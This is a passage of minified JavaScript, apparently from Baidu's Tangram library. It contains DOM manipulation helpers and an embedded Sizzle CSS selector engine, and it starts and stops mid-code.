"),r;return t.forEach(this,function(e){var t=e.className;for(var i=0;i<n.length;i++)if(!~(" "+t+" ").indexOf(" "+n[i]+" ")){r=!1;return}if(r!==!1){r=!0;return}}),r}}),t._util_.getWindowOrDocumentWidthOrHeight=t._util_.getWindowOrDocumentWidthOrHeight||function(){var e={window:{},document:{}};return t.forEach(["Width","Height"],function(n){var r="client"+n,i="offset"+n,s="scroll"+n;e.window["get"+n]=function(e){var n=e.document,i=n.documentElement[r];return t.browser.isStrict&&i||n.body&&n.body[r]||i},e.document["get"+n]=function(e){var t=e.documentElement;return t[r]>=t[s]?t[r]:Math.max(e.body[s],t[s],e.body[i],t[i])}}),function(t,n,r){return e[n][r==="width"?"getWidth":"getHeight"](t)}}(),t.dom.extend({height:function(e){return t._util_.access(this,"height",e,function(e,n,r){var i=r!==undefined,s=i&&parseFloat(r),o=e!=null&&e==e.window?"window":e.nodeType===9?"document":!1;if(i&&s<0||isNaN(s))return;return i&&/^(?:\d*\.)?\d+$/.test(r+="")&&(r+="px"),o?t._util_.getWindowOrDocumentWidthOrHeight(e,o,n):i?e.style.height=r:t._util_.getWidthOrHeight(e,n)})}}),t._util_.isHidden=function(e){return t.dom(e).getCurrentStyle("display")==="none"||!t._util_.contains(e.ownerDocument,e)},t.dom.extend({hide:function(){var e=[],n,r,i;return this.each(function(s,o){if(!o.style)return;n=t(o),e[s]=n.data("olddisplay"),i=o.style.display,e[s]||(r=t._util_.isHidden(o),(i&&i!=="none"||!r)&&n.data("olddisplay",r?i:n.getCurrentStyle("display"))),o.style.display="none"})}}),t.dom.extend({innerHeight:function(){if(this.size()<=0)return 0;var e=this[0],n=e!=null&&e===e.window?"window":e.nodeType===9?"document":!1;return n?t._util_.getWindowOrDocumentWidthOrHeight(e,n,"height"):t._util_.getWidthOrHeight(e,"height","padding")}}),t.dom.extend({innerWidth:function(){if(this.size()<=0)return 0;var e=this[0],n=e!=null&&e===e.window?"window":e.nodeType===9?"document":!1;return n?t._util_.getWindowOrDocumentWidthOrHeight(e,n,"width"):t._util_.getWidthOrHeight(e,"width","padding")}}),t.dom.extend({insertAfter:function(e){var n=[],r=n.push;return t.check("^(?:string|HTMLElement|\\$DOM)$","baidu.dom.insertAfter"),t._util_.smartInsertTo(this,e,function(e){r.apply(n,t.makeArray(e.childNodes)),this.parentNode.insertBefore(e,this.nextSibling)},"after"),this.pushStack(n)}}),t.dom.extend({insertBefore:function(e){var n=[],r=n.push;return t.check("^(?:string|HTMLElement|\\$DOM)$","baidu.dom.insertBefore"),t._util_.smartInsertTo(this,e,function(e){r.apply(n,t.makeArray(e.childNodes)),this.parentNode.insertBefore(e,this)},"before"),this.pushStack(n)}}),t.dom.extend({insertHTML:function(e,n){var r,i,s=this[0];return s.insertAdjacentHTML&&!t.browser.opera?s.insertAdjacentHTML(e,n):(r=s.ownerDocument.createRange(),e=e.toUpperCase(),e=="AFTERBEGIN"||e=="BEFOREEND"?(r.selectNodeContents(s),r.collapse(e=="AFTERBEGIN")):(i=e=="BEFOREBEGIN",r[i?"setStartBefore":"setEndAfter"](s),r.collapse(i)),r.insertNode(r.createContextualFragment(n))),s}}),t.dom.extend({is:function(e){return t.dom.match(this,e).length>0}}),t.dom.extend({last:function(){return this.eq(-1)}}),t.dom.extend({next:function(e){var n=[];return t.forEach(this,function(e){while((e=e.nextSibling)&&e&&e.nodeType!=1);e&&(n[n.length++]=e)}),this.pushStack(e?t.dom.match(n,e):n)}}),t.dom.extend({nextAll:function(e){var n=[];return t.forEach(this,function(e){while(e=e.nextSibling)e&&e.nodeType==1&&n.push(e)}),this.pushStack(t.dom.match(n,e))}}),t.dom.extend({nextUntil:function(e,n){var r=t.array();return t.forEach(this,function(n){var i=t.array();while(n=n.nextSibling)n&&n.nodeType==1&&i.push(n);if(e&&i.length){var s=t.dom.match(i,e);s.length&&(i=i.slice(0,i.indexOf(s[0])))}t.merge(r,i)}),this.pushStack(t.dom.match(r,n))}}),t.dom.extend({not:function(e){var n,r,i,s=this.get(),o=t.isArray(e)?e:t.dom.match(this,e);for(n=s.length-1;n>-1;n--)for(r=0,i=o.length;r<i;r++)o[r]===s[n]&&s.splice(n,1);return this.pushStack(s)}}),t.dom.extend({one:function(e,t,n,r){return this.on(e,t,n,r,1)}}),t.dom.extend({outerHeight:function(e){if(this.size()<=0)return 0;var n=this[0],r=n!=null&&n===n.window?"window":n.nodeType===9?"document":!1;return r?t._util_.getWindowOrDocumentWidthOrHeight(n,r,"height"):t._util_.getWidthOrHeight(n,"height","padding|border"+(e?"|margin":""))}}),t.dom.extend({outerWidth:function(e){if(this.size()<=0)return 0;var n=this[0],r=n!=null&&n===n.window?"window":n.nodeType===9?"document":!1;return r?t._util_.getWindowOrDocumentWidthOrHeight(n,r,"width"):t._util_.getWidthOrHeight(n,"width","padding|border"+(e?"|margin":""))}}),t.dom.extend({parent:function(e){var n=[];return t.forEach(this,function(e){(e=e.parentNode)&&e.nodeType==1&&n.push(e)}),this.pushStack(t.dom.match(n,e))}}),t.dom.extend({parents:function(e){var n=[];return t.forEach(this,function(e){var r=[];while((e=e.parentNode)&&e.nodeType==1)r.push(e);t.merge(n,r)}),this.pushStack(t.dom.match(n,e))}}),t.dom.extend({parentsUntil:function(e,n){t.check("(string|HTMLElement)(,.+)?","baidu.dom.parentsUntil");var r=[];return t.forEach(this,function(n){var i=t.array();while((n=n.parentNode)&&n.nodeType==1)i.push(n);if(e&&i.length){var s=t.dom.match(i,e);s.length&&(i=i.slice(0,i.indexOf(s[0])))}t.merge(r,i)}),this.pushStack(t.dom.match(r,n))}}),t.dom.extend({prepend:function(){return t.check("^(?:string|function|HTMLElement|\\$DOM)(?:,(?:string|array|HTMLElement|\\$DOM))*$","baidu.dom.prepend"),t._util_.smartInsert(this,arguments,function(e){this.nodeType===1&&this.insertBefore(e,this.firstChild)}),this}}),t.dom.extend({prependTo:function(e){var n=[],r=n.push;return t.check("^(?:string|HTMLElement|\\$DOM)$","baidu.dom.prependTo"),t._util_.smartInsertTo(this,e,function(e){r.apply(n,t.makeArray(e.childNodes)),this.insertBefore(e,this.firstChild)}),this.pushStack(n)}}),t.dom.extend({prev:function(e){var n=[];return t.forEach(this,function(e){while(e=e.previousSibling)if(e.nodeType==1){n.push(e);break}}),this.pushStack(t.dom.match(n,e))}}),t.dom.extend({prevAll:function(e){var n=t.array();return t.forEach(this,function(e){var r=[];while(e=e.previousSibling)e.nodeType==1&&r.push(e);t.merge(n,r.reverse())}),this.pushStack(typeof e=="string"?t.dom.match(n,e):n.unique())}}),t.dom.extend({prevUntil:function(e,n){t.check("(string|HTMLElement)(,.+)?","baidu.dom.prevUntil");var r=[];return t.forEach(this,function(n){var i=t.array();while(n=n.previousSibling)n&&n.nodeType==1&&i.push(n);if(e&&i.length){var s=t.dom.match(i,e);s.length&&(i=i.slice(0,i.indexOf(s[0])))}t.merge(r,i)}),this.pushStack(t.dom.match(r,n))}}),t.dom.extend({prop:function(e,n){return t._util_.access(this,e,n,function(e,n,r){return t._util_.prop(e,n,r)})}}),t.string.extend({escapeReg:function(){return this.replace(new RegExp("([.*+?^=!:${}()|[\\]/\\\\])","g"),"\\$1")}}),void function(e,n){function W(e,t,n,r){var i,u,a,f,l=o++,c=0,h=t.length;typeof n=="string"&&!d.test(n)&&(n=n.toLowerCase(),f=n);for(;c<h;c++){i=t[c];if(i){u=!1,i=i[e];while(i){if(i[s]===l){u=t[i.sizset];break}a=i.nodeType===1,a&&!r&&(i[s]=l,i.sizset=c);if(f){if(i.nodeName.toLowerCase()===n){u=i;break}}else if(a)if(typeof n!="string"){if(i===n){u=!0;break}}else if(F(n,[i]).length>0){u=i;break}i=i[e]}t[c]=u}}}t.query=function(e,n,r){return t.merge(r||[],t.sizzle(e,n))};var r=e.document,i=r.documentElement,s="sizcache"+(Math.random()+"").replace(".",""),o=0,u=Object.prototype.toString,a="undefined",f=!1,l=!0,c=/^#([\w\-]+$)|^(\w+$)|^\.([\w\-]+$)/,h=/((?:\((?:\([^()]+\)|[^()]+)+\)|\[(?:\[[^\[\]]*\]|['"][^'"]*['"]|[^\[\]'"]+)+\]|\\.|[^ >+~,(\[\\]+)+|[>+~])(\s*,\s*)?((?:.|\r|\n)*)/g,p=/\\/g,d=/\W/,v=/^\w/,m=/\D/,g=/(-?)(\d*)(?:n([+\-]?\d*))?/,y=/^\+|\s*/g
,b=/h\d/i,w=/input|select|textarea|button/i,E=/[\t\n\f\r]/g,S="(?:[-\\w]|[^\\x00-\\xa0]|\\\\.)",x={ID:new RegExp("#("+S+"+)"),CLASS:new RegExp("\\.("+S+"+)"),NAME:new RegExp("\\[name=['\"]*("+S+"+)['\"]*\\]"),TAG:new RegExp("^("+S.replace("[-","[-\\*")+"+)"),ATTR:new RegExp("\\[\\s*("+S+"+)\\s*(?:(\\S?=)\\s*(?:(['\"])(.*?)\\3|(#?"+S+"*)|)|)\\s*\\]"),PSEUDO:new RegExp(":("+S+"+)(?:\\((['\"]?)((?:\\([^\\)]+\\)|[^\\(\\)]*)+)\\2\\))?"),CHILD:/:(only|nth|last|first)-child(?:\(\s*(even|odd|(?:[+\-]?\d+|(?:[+\-]?\d*)?n\s*(?:[+\-]\s*\d+)?))\s*\))?/,POS:/:(nth|eq|gt|lt|first|last|even|odd)(?:\((\d*)\))?(?=[^\-]|$)/},T=x.POS,N=function(){var e,t=function(e,t){return"\\"+(t-0+1)},n={};for(e in x)x[e]=new RegExp(x[e].source+/(?![^\[]*\])(?![^\(]*\))/.source),n[e]=new RegExp(/(^(?:.|\r|\n)*?)/.source+x[e].source.replace(/\\(\d+)/g,t));return x.globalPOS=T,n}(),C=function(e){var t=!1,n=r.createElement("div");try{t=e(n)}catch(i){}return n=null,t},k=C(function(e){var t=!0,n="script"+(new Date).getTime();return e.innerHTML="<a name ='"+n+"'/>",i.insertBefore(e,i.firstChild),r.getElementById(n)&&(t=!1),i.removeChild(e),t}),L=C(function(e){return e.appendChild(r.createComment("")),e.getElementsByTagName("*").length===0}),A=C(function(e){return e.innerHTML="<a href='#'></a>",e.firstChild&&typeof e.firstChild.getAttribute!==a&&e.firstChild.getAttribute("href")==="#"}),O=C(function(e){return e.innerHTML="<div class='test e'></div><div class='test'></div>",!e.getElementsByClassName||e.getElementsByClassName("e").length===0?!1:(e.lastChild.className="e",e.getElementsByClassName("e").length!==1)});[0,0].sort(function(){return l=!1,0});var M=function(e,i,s){s=s||[],i=i||r;var o,u,a,f=i.nodeType;if(f!==1&&f!==9)return[];if(!e||typeof e!="string")return s;e=t.string(e).trim();if(!e)return s;a=D(i);if(!a)if(o=c.exec(e))if(o[1]){if(f===9){u=i.getElementById(o[1]);if(!u||!u.parentNode)return P([],s);if(u.id===o[1])return P([u],s)}else if(i.ownerDocument&&(u=i.ownerDocument.getElementById(o[1]))&&B(i,u)&&u.id===o[1])return P([u],s)}else{if(o[2])return e==="body"&&i.body?P([i.body],s):P(i.getElementsByTagName(e),s);if(O&&o[3]&&i.getElementsByClassName)return P(i.getElementsByClassName(o[3]),s)}return _(e,i,s,n,a)},_=function(e,t,n,r,i){var s,o,a,f,l,c,p,d,v=t,m=!0,g=[],y=e;do{h.exec(""),s=h.exec(y);if(s){y=s[3],g.push(s[1]);if(s[2]){f=s[3];break}}}while(s);if(g.length>1&&T.exec(e))if(g.length===2&&R.relative[g[0]])o=X(g[0]+g[1],t,r,i);else{o=R.relative[g[0]]?[t]:M(g.shift(),t);while(g.length)e=g.shift(),R.relative[e]&&(e+=g.shift()),o=X(e,o,r,i)}else{!r&&g.length>1&&t.nodeType===9&&!i&&x.ID.test(g[0])&&!x.ID.test(g[g.length-1])&&(l=j(g.shift(),t,i),t=l.expr?F(l.expr,l.set)[0]:l.set[0]);if(t){l=r?{expr:g.pop(),set:P(r)}:j(g.pop(),g.length>=1&&(g[0]==="~"||g[0]==="+")&&t.parentNode||t,i),o=l.expr?F(l.expr,l.set):l.set,g.length>0?a=P(o):m=!1;while(g.length)c=g.pop(),p=c,R.relative[c]?p=g.pop():c="",p==null&&(p=t),R.relative[c](a,p,i)}else a=g=[]}a||(a=o),a||I(c||e);if(u.call(a)==="[object Array]")if(!m)n.push.apply(n,a);else if(t&&t.nodeType===1)for(d=0;a[d]!=null;d++)a[d]&&(a[d]===!0||a[d].nodeType===1&&B(t,a[d]))&&n.push(o[d]);else for(d=0;a[d]!=null;d++)a[d]&&a[d].nodeType===1&&n.push(o[d]);else P(a,n);return f&&(_(f,v,n,r,i),H(n)),n},D=t._util_.isXML,P=t.makeArray,H=function(e){if(U){f=l,e.sort(U);if(f)for(var t=1;t<e.length;t++)e[t]===e[t-1]&&e.splice(t--,1)}return e},B=t._util_.contains,j=function(e,t,n){var r,i,s,o,u,f;if(!e)return[];for(i=0,s=R.order.length;i<s;i++){u=R.order[i];if(o=N[u].exec(e)){f=o[1],o.splice(1,1);if(f.substr(f.length-1)!=="\\"){o[1]=(o[1]||"").replace(p,""),r=R.find[u](o,t,n);if(r!=null){e=e.replace(x[u],"");break}}}}return r||(r=typeof t.getElementsByTagName!==a?t.getElementsByTagName("*"):[]),{set:r,expr:e}},F=function(e,t,r,i){var s,o,u,a,f,l,c,h,p,d=e,v=[],m=t,g=t&&t[0]&&D(t[0]);while(e&&t.length){for(u in R.filter)if((s=N[u].exec(e))!=null&&s[2]){l=R.filter[u],c=s[1],o=!1,s.splice(1,1);if(c.substr(c.length-1)==="\\")continue;m===v&&(v=[]);if(R.preFilter[u]){s=R.preFilter[u](s,m,r,v,i,g);if(!s)o=a=!0;else if(s===!0)continue}if(s)for(h=0;(f=m[h])!=null;h++)f&&(a=l(f,s,h,m),p=i^a,r&&a!=null?p?o=!0:m[h]=!1:p&&(v.push(f),o=!0));if(a!==n){r||(m=v),e=e.replace(x[u],"");if(!o)return[];break}}if(e===d){if(o!=null)break;I(e)}d=e}return m},I=function(e){throw new Error(e)},q=function(e){var t,n,r=e.nodeType,i="";if(r){if(r===1||r===9||r===11){if(typeof e.textContent=="string")return e.textContent;for(e=e.firstChild;e;e=e.nextSibling)i+=q(e)}else if(r===3||r===4)return e.nodeValue}else for(t=0;n=e[t];t++)n.nodeType!==8&&(i+=q(n));return i},R={match:x,leftMatch:N,order:["ID","NAME","TAG"],attrMap:{"class":"className","for":"htmlFor"},attrHandle:{href:A?function(e){return e.getAttribute("href")}:function(e){return e.getAttribute("href",2)},type:function(e){return e.getAttribute("type")}},relative:{"+":function(e,t){var n=typeof t=="string",r=n&&!d.test(t),i=n&&!r;r&&(t=t.toLowerCase());for(var s=0,o=e.length,u;s<o;s++)if(u=e[s]){while((u=u.previousSibling)&&u.nodeType!==1);e[s]=i||u&&u.nodeName.toLowerCase()===t?u||!1:u===t}i&&F(t,e,!0)},">":function(e,t){var n,r=typeof t=="string",i=0,s=e.length;if(r&&!d.test(t)){t=t.toLowerCase();for(;i<s;i++){n=e[i];if(n){var o=n.parentNode;e[i]=o.nodeName.toLowerCase()===t?o:!1}}}else{for(;i<s;i++)n=e[i],n&&(e[i]=r?n.parentNode:n.parentNode===t);r&&F(t,e,!0)}},"":function(e,t,n){W("parentNode",e,t,n)},"~":function(e,t,n){W("previousSibling",e,t,n)}},find:{ID:k?function(e,t,n){if(typeof t.getElementById!==a&&!n){var r=t.getElementById(e[1]);return r&&r.parentNode?[r]:[]}}:function(e,t,r){if(typeof t.getElementById!==a&&!r){var i=t.getElementById(e[1]);return i?i.id===e[1]||typeof i.getAttributeNode!==a&&i.getAttributeNode("id").nodeValue===e[1]?[i]:n:[]}},NAME:function(e,t){if(typeof t.getElementsByName!==a){var n=[],r=t.getElementsByName(e[1]),i=0,s=r.length;for(;i<s;i++)r[i].getAttribute("name")===e[1]&&n.push(r[i]);return n.length===0?null:n}},TAG:L?function(e,t){if(typeof t.getElementsByTagName!==a)return t.getElementsByTagName(e[1])}:function(e,t){var n=t.getElementsByTagName(e[1]);if(e[1]==="*"){var r=[],i=0;for(;n[i];i++)n[i].nodeType===1&&r.push(n[i]);n=r}return n}},preFilter:{CLASS:function(e,t,n,r,i,s){e=" "+e[1].replace(p,"")+" ";if(s)return e;for(var o=0,u;(u=t[o])!=null;o++)u&&(i^(u.className&&~(" "+u.className+" ").replace(E," ").indexOf(e))?n||r.push(u):n&&(t[o]=!1));return!1},ID:function(e){return e[1].replace(p,"")},TAG:function(e,t){return e[1].replace(p,"").toLowerCase()},CHILD:function(e){if(e[1]==="nth"){e[2]||I(e[0]),e[2]=e[2].replace(y,"");var t=g.exec(e[2]==="even"&&"2n"||e[2]==="odd"&&"2n+1"||!m.test(e[2])&&"0n+"+e[2]||e[2]);e[2]=t[1]+(t[2]||1)-0,e[3]=t[3]-0}else e[2]&&I(e[0]);return e[0]=o++,e},ATTR:function(e,t,n,r,i,s){var o=e[1]=e[1].replace(p,"");return!s&&R.attrMap[o]&&(e[1]=R.attrMap[o]),e[4]=(e[4]||e[5]||"").replace(p,""),e[2]==="~="&&(e[4]=" "+e[4]+" "),e},PSEUDO:function(e,t,n,i,s,o){if(e[1]==="not"){if(!((h.exec(e[3])||"").length>1||v.test(e[3]))){var u=F(e[3],t,n,!s);return n||i.push.apply(i,u),!1}e[3]=_(e[3],r,[],t,o)}else if(x.POS.test(e[0])||x.CHILD.test(e[0]))return!0;return e},POS:function(e){return e.unshift(!0),e}},filters:{enabled:function(e){return e.disabled===!1},disabled:function(e){return e.disabled===!0},checked:function(e){var t=e.nodeName.toLowerCase();return t==="input"&&!!e.checked||t==="option"&&!!e.selected},selected:function(e){return e.parentNode&&e.parentNode.selectedIndex,e.selected===!0},parent:function(e){return!!e.firstChild},empty:function(e){return!e.firstChild},has:function(e,t,n){return!!M(n[3],e).length},header:function(e){return b.test(e.nodeName)},text:function(e){var t=e.getAttribute("type"),n=e.type;return e.nodeName.toLowerCase()==="input"&&"text"===n&&(t===null||t.toLowerCase()===n)},radio:function(e){return e.nodeName.toLowerCase()==="input"&&"radio"===e.type},checkbox:function(e){return e.nodeName.toLowerCase()==="input"&&"checkbox"===e.type},file:function(e){return e.nodeName.toLowerCase()==="input"&&"file"===e.type},password:function(e){return e.nodeName.toLowerCase()==="input"&&"password"===e.type},submit:function(e){var t=e.nodeName.toLowerCase();return(t==="input"||t==="button")&&"submit"===e.type},image:function(e){return e.nodeName.toLowerCase()==="input"&&"image"===e.type},reset:function(e){var t=e.nodeName.toLowerCase();return(t==="input"||t==="button")&&"reset"===e.type},button:function(e){var t=e.nodeName.toLowerCase();return t==="input"&&"button"===e.type||t==="button"},input:function(e){return w.test(e.nodeName)},focus:function(e){var t=e.ownerDocument;return e===t.activeElement&&(!t.hasFocus||t.hasFocus())&&(!!e.type||!!e.href)},active:function(e){return e===e.ownerDocument.activeElement},contains:function(e,t,n){return(e.textContent||e.innerText||q(e)).indexOf(n[3])>=0}},setFilters:{first:function(e,t){return t===0},last:function(e,t,n,r){return t===r.length-1},even:function(e,t){return t%2===0},odd:function(e,t){return t%2===1},lt:function(e,t,n){return t<n[3]-0},gt:function(e,t,n){return t>n[3]-0},nth:function(e,t,n){return n[3]-0===t},eq:function(e,t,n){return n[3]-0===t}},filter:{PSEUDO:function(e,t,n,r){var i=t[1],s=R.filters[i];if(s)return s(e,n,t,r);if(i==="not"){var o=t[3],u=0,a=o.length;for(;u<a;u++)if(o[u]===e)return!1;return!0}I(i)},CHILD:function(e,t){var n,r,i,o,u,a,f,l=t[1],c=e;switch(l){case"only":case"first":while(c=c.previousSibling)if(c.nodeType===1)return!1;if(l==="first")return!0;c=e;case"last":while(c=c.nextSibling)if(c.nodeType===1)return!1;return!0;case"nth":n=t[2],r=t[3];if(n===1&&r===0)return!0;i=t[0],o=e.parentNode;if(o&&(o[s]!==i||!e.nodeIndex)){a=0;for(c=o.firstChild;c;c=c.nextSibling)c.nodeType===1&&(c.nodeIndex=++a);o[s]=i}return f=e.nodeIndex-r,n===0?f===0:f%n===0&&f/n>=0}},ID:k?function(e,t){return e.nodeType===1&&e.getAttribute("id")===t}:function(e,t){var n=typeof e.getAttributeNode!==a&&e.getAttributeNode("id");return e.nodeType===1&&n&&n.nodeValue===t},TAG:function(e,t){return t==="*"&&e.nodeType===1||!!e.nodeName&&e.nodeName.toLowerCase()===t},CLASS:function(e,t){return(" "+(e.className||e.getAttribute("class"))+" ").indexOf(t)>-1},ATTR:function(e,t){var n=t[1],r=R.attrHandle[n]?R.attrHandle[n](e):e[n]!=null?e[n]:e.getAttribute(n),i=r+"",s=t[2],o=t[4];return r==null?s==="!=":s==="="?i===o:s==="*="?i.indexOf(o)>=0:s==="~="?(" "+i+" ").indexOf(o)>=0:o?s==="!="?i!==o:s==="^="?i.indexOf(o)===0:s==="$="?i.substr(i.length-o.length)===o:s==="|="?i===o||i.substr(0,o.length+1)===o+"-":!1:i&&r!==!1},POS:function(e,t,n,r){var i=t[2],s=R.setFilters[i];if(s)return s(e,n,t,r)}}};O&&(R.order.splice(1,0,"CLASS"),R.find.CLASS=function(e,t,n){if(typeof t.getElementsByClassName!==a&&!n)return t.getElementsByClassName(e[1])});var U,z;i.compareDocumentPosition?U=function(e,t){return e===t?(f=!0,0):!e.compareDocumentPosition||!t.compareDocumentPosition?e.compareDocumentPosition?-1:1:e.compareDocumentPosition(t)&4?-1:1}:(U=function(e,t){if(e===t)return f=!0,0;if(e.sourceIndex&&t.sourceIndex)return e.sourceIndex-t.sourceIndex;var n,r,i=[],s=[],o=e.parentNode,u=t.parentNode,a=o;if(o===u)return z(e,t);if(!o)return-1;if(!u)return 1;while(a)i.unshift(a),a=a.parentNode;a=u;while(a)s.unshift(a),a=a.parentNode;n=i.length,r=s.length;for(var l=0;l<n&&l<r;l++)if(i[l]!==s[l])return z(i[l],s[l]);return l===n?z(e,s[l],-1):z(i[l],t,1)},z=function(e,t,n){if(e===t)return n;var r=e.nextSibling;while(r){if(r===t)return-1;r=r.nextSibling}return 1}),r.querySelectorAll&&function(){var e=_,t="__sizzle__",n=/^\s*[+~]/,r=/'/g,i=[];C(function(e){e.innerHTML="<select><option selected></option></select>",e.querySelectorAll("[selected]").length||i.push("\\[[\\x20\\t\\n\\r\\f]*(?:checked|disabled|ismap|multiple|readonly|selected|value)"),e.querySelectorAll(":checked").length||i.push(":checked")}),C(function(e){e.innerHTML="<p class=''></p>",e.querySelectorAll("[class^='']").length&&i.push("[*^$]=[\\x20\\t\\n\\r\\f]*(?:\"\"|'')"),e.innerHTML="<input type='hidden'>",e.querySelectorAll(":enabled").length||i.push(":enabled",":disabled")}),i=i.length&&new RegExp(i.join("|")),_=function(s,o,u,a,f){if(!a&&!f&&(!i||!i.test(s)))if(o.nodeType===9)try{return P(o.querySelectorAll(s),u)}catch(l){}else if(o.nodeType===1&&o.nodeName.toLowerCase()!=="object"){var c=o,h=o.getAttribute("id"),p=h||t,d=o.parentNode,v=n.test(s);h?p=p.replace(r,"\\$&"):o.setAttribute("id",p),v&&d&&(o=d);try{if(!v||d)return P(o.querySelectorAll("[id='"+p+"'] "+s),u)}catch(l){}finally{h||c.removeAttribute("id")}}return e(s,o,u,a,f)}}();var X=function(e,t,n,r){var i,s=[],o="",u=t.nodeType?[t]:t,a=0,f=u.length;while(i=x.PSEUDO.exec(e))o+=i[0],e=e.replace(x.PSEUDO,"");R.relative[e]&&(e+="*");for(;a<f;a++)_(e,u[a],s,n,r);return F(o,s)};e.Sizzle=t.sizzle=M,t.query.matches=function(e,t){return _(e,r,[],t,D(r))}}(window),t.dom.extend({ready:function(){var e=this,n,r=window.document;t._util_.isDomReady=!1,t._util_._readyWait=1,t.dom.holdReady=function(e){e?t._util_.readyWait++:i(!0)};var i=function(e){if(e===!0?--t._util_.readyWait:t._util_.isDomReady)return;if(!r.body)return setTimeout(i,1);t._util_.isReady=!0;if(e!==!0&&--t._util_.readyWait>0)return;n.resolveWith(r),t.dom.trigger&&t.dom(r).trigger("ready").off("ready")},s=function(){r.addEventListener?(r.removeEventListener("DOMContentLoaded",s,!1),i()):r.readyState==="complete"&&(r.detachEvent("onreadystatechange",s),i())},o=function(e){if(!n){n=t.Deferred();if(r.readyState==="complete")setTimeout(i,1);else if(r.addEventListener)r.addEventListener("DOMContentLoaded",s,!1),window.addEventListener("load",i,!1);else{r.attachEvent("onreadystatechange",s),window.attachEvent("onload",i);var o=!1;try{o=window.frameElement==null&&r.documentElement}catch(u){}o&&o.doScroll&&function a(){if(!t._util_.isDomReady){try{o.doScroll("left")}catch(e){return setTimeout(a,50)}i()}}()}}return n.promise(e)};return function(t){return o().done(t),e}}()}),t.dom.extend({removeAttr:function(e){return this.each(function(n,r){t._util_.removeAttr(r,e)}),this}}),t.dom.extend({removeClass:function(e){var n=typeof e,r=" ";arguments.length||t.forEach(this,function(e){e.className=""});if(n=="string"){e=t.string.trim(e);var i=e.split(" ");t.forEach(this,function(e){var n=e.className;for(var s=0;s<i.length;s++)while(~(r+n+r).indexOf(r+i[s]+r))n=(r+n+r).replace(r+i[s]+r,r);e.className=t.string.trim(n)})}else n=="function"&&t.forEach(this,function(n,r,i){t.dom(n).removeClass(e.call(n,r,n.className))});return this}}),t.dom.extend({removeData:function(){var e=t.key,n=t.global("_maps_HTMLElementData");return function(r){return t.forEach(this,function(n){!n[e]&&(n[e]=t.id())}),t.forEach(this,function(i){var s=n[i[e]];typeof r=="string"?s&&delete s[r]:t.type(r)=="array"&&t.forEach(r,function(e){s&&delete s[e]})}),this}}()}),t.dom.extend({removeProp:function(e){return e=t._util_.propFixer[e]||e,this.each(function(t,n){try{n[e]=undefined,delete n[e]}catch(r){}}),this}}),t._util_.smartScroll=function(e){function s(e){return e&&e.nodeType===9}function o(e){return t.type(e)=="Window"?e:s(e)?e.defaultView||e.parentWindow:!1}var n={scrollLeft:"pageXOffset",scrollTop:"pageYOffset"}[e],r=e==="scrollLeft",i={};return{get:function(r){var i=o(r);return i?n in i?i[n]:t.browser.isStrict&&i.document.documentElement[e]||i.document.body[e]:r[e]},set:function(t,n){if(!t)return;var i=o(t);i?i.scrollTo(r?n:this.get(t),r?this.get(t):n):t[e]=n}}},t.dom.extend({scrollLeft:function(){var e=t._util_.smartScroll("scrollLeft");return function(n){return n&&t.check("^(?:number|string)$","baidu.dom.scrollLeft"),this.size()<=0?n===undefined?0:this:n===undefined?e.get(this[0]):e.set(this[0],n)||this}}()}),t.dom.extend({scrollTop:function(){var e=t._util_.smartScroll("scrollTop");return function(n){return n&&t.check("^(?:number|string)$","baidu.dom.scrollTop"),this.size()<=0?n===undefined?0:this:n===undefined?e.get(this[0]):e.set(this[0],n)||this}}()}),t.dom.setPixel=function(e,n,r){typeof r!="undefined"&&(t.dom.g(e).style[n]=r+(isNaN(r)?"":"px"))},t._util_.getDefaultDisplayValue=function(){var e={};return function(n){if(e[n])return e[n];var r=document.createElement(n),i,s,o;document.body.appendChild(r),i=t.dom(r).getCurrentStyle("display"),document.body.removeChild(r);if(i===""||i==="none")s=document.body.appendChild(document.createElement("iframe")),s.frameBorder=s.width=s.height=0,o=(s.contentWindow||s.contentDocument).document,o.writeln("<!DOCTYPE html><html><body>"),o.close(),r=o.appendChild(o.createElement(n)),i=t.dom(r).getCurrentStyle("display"),document.body.removeChild(s),s=null;return r=null,e[n]=i}}(),t.dom.extend({show:function(){var e=[],n,r;return this.each(function(i,s){if(!s.style)return;r=t.dom(s),n=s.style.display,e[i]=r.data("olddisplay"),!e[i]&&n==="none"&&(s.style.display=""),s.style.display===""&&t._util_.isHidden(s)&&r.data("olddisplay",e[i]=t._util_.getDefaultDisplayValue(s.nodeName))}),this.each(function(t,n){if(!n.style)return;if(n.style.display==="none"||n.style.display==="")n.style.display=e[t]||""})}}),t.dom.extend({siblings:function(e){var n=[];return t.forEach(this,function(e){var r=[],i=[],s=e;while(s=s.previousSibling)s.nodeType==1&&r.push(s);while(e=e.nextSibling)e.nodeType==1&&i.push(e);t.merge(n,r.reverse().concat(i))}),this.pushStack(t.dom.match(n,e))}}),t.dom.extend({slice:function(){var e=Array.prototype.slice;return function(n,r){return t.check("number(,number)?","baidu.dom.slice"),this.pushStack(e.apply(this,arguments))}}()}),t.dom.extend({text:function(e){var n=t.dom,r=this,i=!1,s;if(this.size()<=0)switch(typeof e){case"undefined":return undefined;default:return r}var o=function(e){var t,n="",r=0,i=e.nodeType;if(i)if(i===1||i===9||i===11){if(typeof e.textContent=="string")return e.textContent;for(e=e.firstChild;e;e=e.nextSibling)n+=o(e)}else if(i===3||i===4)return e.nodeValue;return n};return t.forEach(r,function(t,r){var u=n(t);if(s)return;switch(typeof e){case"undefined":return s=o(t),s;case"number":e=String(e);case"string":i=!0,u.empty().append((t&&t.ownerDocument||document).createTextNode(e));break;case"function":i=!0,u.text(e.call(t,r,u.text()))}}),i?r:s}}),t.dom.extend({toggle:function(){for(var e=0,t=this.size();e<t;e++){var n=this.eq(e);n.css("display")!="none"?n.hide():n.show()}}}),t.dom.extend({toggleClass:function(e,n){var r=typeof e,n=typeof n=="undefined"?n:Boolean(n);arguments.length<=0&&t.forEach(this,function(e){e.className=""});switch(typeof e){case"string":e=e.replace(/^\s+/g,"").replace(/\s+$/g,"").replace(/\s+/g," ");var i=e.split(" ");t.forEach(this,function(e){var t=e.className;for(var r=0;r<i.length;r++)~(" "+t+" ").indexOf(" "+i[r]+" ")&&typeof n=="undefined"?t=(" "+t+" ").replace(" "+i[r]+" "," "):!~(" "+t+" ").indexOf(" "+i[r]+" ")&&typeof n=="undefined"?t+=" "+i[r]:!~(" "+t+" ").indexOf(" "+i[r]+" ")&&n===!0?t+=" "+i[r]:~(" "+t+" ").indexOf(" "+i[r]+" 